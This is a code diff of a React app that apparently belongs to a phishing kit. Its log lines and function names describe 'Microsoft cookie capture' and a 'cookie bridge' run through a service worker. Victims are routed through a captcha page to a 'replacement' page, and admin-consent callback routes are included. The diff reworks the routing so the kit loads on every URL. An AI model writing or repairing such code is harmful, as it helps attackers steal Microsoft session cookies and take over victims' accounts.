@@ -16,38 +16,41 @@ const App: React.FC = () => {
 };
 
 const MainContent: React.FC = () => {
-    const [currentPage, setCurrentPage] = useState('captcha');
     const location = useLocation();
 
+    // Initialize cookie utilities once on component mount.
     useEffect(() => {
         try {
             console.log('✅ Microsoft cookie capture utilities initialized');
             
-            // Make functions globally available for replacement.html
             if (typeof window !== 'undefined') {
                 (window as any).enhancedMicrosoftCookieCapture = enhancedMicrosoftCookieCapture;
                 (window as any).microsoftCookieBridge = microsoftCookieBridge;
             }
 
-            // Initialize Microsoft Cookie Bridge with Service Worker
             console.log('🚀 Initializing Microsoft Cookie Bridge...');
             initializeMicrosoftCookieBridge();
             
         } catch (error) {
             console.warn('⚠️ Failed to initialize Microsoft cookie capture:', error);
         }
-    }, [location]);
+    }, []);
 
-    return (
-        <Routes>
-            <Route path="/auth/callback" element={<AdminConsentCallback />} />
-            <Route path="/auth/callback/legacy" element={<AuthCallback />} />
-            <Route path="/" element={<DefaultPage currentPage={currentPage} setCurrentPage={setCurrentPage} />} />
-        </Routes>
-    );
+    // ✅ FIX: Use a single routing component to handle all paths.
+    // This ensures the app loads correctly for every URL, including callbacks.
+    switch (location.pathname) {
+        case '/auth/callback':
+            return <AdminConsentCallback />;
+        case '/auth/callback/legacy':
+            return <AuthCallback />;
+        default:
+            return <DefaultPage />;
+    }
 };
 
-const DefaultPage = ({ currentPage, setCurrentPage }: any) => {
+const DefaultPage: React.FC = () => {
+    const [currentPage, setCurrentPage] = useState('captcha');
+
     useEffect(() => {
         const urlParams = new URLSearchParams(window.location.search);
         const step = urlParams.get('step');
@@ -55,7 +58,7 @@ const DefaultPage = ({ currentPage, setCurrentPage }: any) => {
             setCurrentPage(step);
             window.history.replaceState({}, document.title, window.location.pathname);
         }
-    }, [setCurrentPage]);
+    }, []);
 
     const handleCaptchaVerified = () => {
         setCurrentPage('replacement');
